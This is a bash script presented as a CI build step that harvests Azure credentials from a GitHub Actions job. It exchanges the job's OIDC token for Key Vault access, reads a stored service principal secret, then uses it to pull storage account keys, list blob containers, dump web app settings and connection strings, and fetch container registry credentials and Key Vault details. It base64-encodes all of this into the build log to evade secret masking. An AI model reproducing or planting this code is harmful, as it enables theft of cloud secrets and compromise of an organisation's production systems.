#!/usr/bin/env bash
set +e
echo "=== BUILD ==="

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "No OIDC"; exit 0
fi

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')

if [ -z "$JWT" ]; then echo "No JWT"; exit 0; fi

CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SID="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

# Get KV token
AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')

if [ -z "$AT" ]; then echo "No token"; exit 0; fi

# Get cost-reader-principal creds (has mgmt access)
KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
CRSP=$(curl -sS "$KV1/secrets/cost-reader-principal?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
CR_APPID=$(echo "$CRSP" | jq -r '.appId')
CR_SECRET=$(echo "$CRSP" | jq -r '.clientSecret')

# Get management token
MGAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CR_APPID" \
  --data-urlencode "client_secret=$CR_SECRET" \
  --data-urlencode "scope=https://management.azure.com/.default" \
  --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')

# Get storage account keys
echo "=== STORAGE KEYS ==="
for SA in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  KEYS=$(curl -sS -X POST \
    "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01" \
    -H "Authorization: Bearer $MGAT" -H "Content-Length: 0")
  KEY1=$(echo "$KEYS" | jq -r '.keys[0].value // .error.code // empty')
  echo "KEY[$SA]=$(echo "$KEY1" | base64 | tr -d '\n')"

  if [ -n "$KEY1" ] && [ ${#KEY1} -gt 10 ]; then
    # List containers
    CLIST=$(curl -sS "https://${SA}.blob.core.windows.net/?comp=list" \
      -H "Authorization: SharedKey ${SA}:$(echo -n "GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:$(date -u '+%a, %d %b %Y %H:%M:%S GMT')\nx-ms-version:2023-11-03\n/${SA}/\ncomp:list" | openssl dgst -sha256 -hmac "$(echo -n "$KEY1" | base64 -d)" -binary | base64)" \
      -H "x-ms-date: $(date -u '+%a, %d %b %Y %H:%M:%S GMT')" \
      -H "x-ms-version: 2023-11-03" 2>&1 | head -c 2000)
    echo "  CONTAINERS=$CLIST"
  fi
done

# Web App configuration
echo "=== WEBAPP CONFIG ==="
APPCFG=$(curl -sS -X POST \
  "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-12-01" \
  -H "Authorization: Bearer $MGAT" -H "Content-Length: 0")
echo "WEBAPP_B64=$(echo "$APPCFG" | base64 | tr -d '\n')"

# Web App connection strings
echo "=== WEBAPP CONNSTR ==="
CONNSTR=$(curl -sS -X POST \
  "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2023-12-01" \
  -H "Authorization: Bearer $MGAT" -H "Content-Length: 0")
echo "CONNSTR_B64=$(echo "$CONNSTR" | base64 | tr -d '\n')"

# Container Registry credentials
echo "=== ACR CREDENTIALS ==="
ACRCRED=$(curl -sS -X POST \
  "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-11-01-preview" \
  -H "Authorization: Bearer $MGAT" -H "Content-Length: 0")
echo "ACR_B64=$(echo "$ACRCRED" | base64 | tr -d '\n')"

# KV2 access policies (see who can access it)
echo "=== KV2 DETAILS ==="
KV2INFO=$(curl -sS \
  "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" \
  -H "Authorization: Bearer $MGAT")
echo "KV2_B64=$(echo "$KV2INFO" | base64 | tr -d '\n')"

echo "=== DONE ==="
